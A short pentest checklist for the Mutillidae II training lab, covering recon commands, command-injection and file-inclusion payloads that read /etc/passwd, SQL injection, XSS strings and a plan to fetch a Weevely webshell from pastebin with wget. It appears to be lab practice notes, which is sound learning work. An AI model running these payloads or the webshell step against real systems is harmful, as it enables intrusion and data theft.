# MUTILLIDAE II

## Gathering Info (recopilación de información)
- [ ] nmap -sS -sV -O -v 192.168.2.148 -n --min-rate 4000 -oA demo
- [ ] nmap -sT -sC -sV -A -oA full-scan -p- 
- [ ] nikto -h 192.168.2.148 -o demo
- [ ] whatweb 192.168.2.148
- [ ] shodan, censys, ipdomain, dnsdumpster, etc.
- [ ] whatsRun, whatWeb, wpscan, cmsmap, etc
- [ ] campish, gophish, etc

- [ ] DOCUMENTAR TODO > 192.168.2.243:8080/dashboard [DefectDojo, PeteReports, Pentest.ws, ...]

## Execute commands
- [ ] 8.8.8.8;ls; [DNS lookup]
- [ ] 8.8.8.8;cat /etc/passwd; [DNSlookup]
- [ ] http://192.168.2.148/mutillidae/index.php?page=/etc/passwd [login]
- [ ] crear webshell en Weevely y subir a pastebin, descarar con wget y modificar nombre para llamarla desde consola [DNSlookup]
## SQLi
- [ ] ' [muestra la query]
- [ ] ramsal' OR 1=1; -- SELECT * FROM accounts;

## XSS
- [ ] <script>alert('BeeHackers was here');</script>

## XSS STORED 
- [ ] This is my post <script>alert("boom")</script> [add post]

## BruteForce Login
- [ ] http://192.168.2.148/mutillidae/index.php?page=login.php [utilizamos el intruder de Burp]
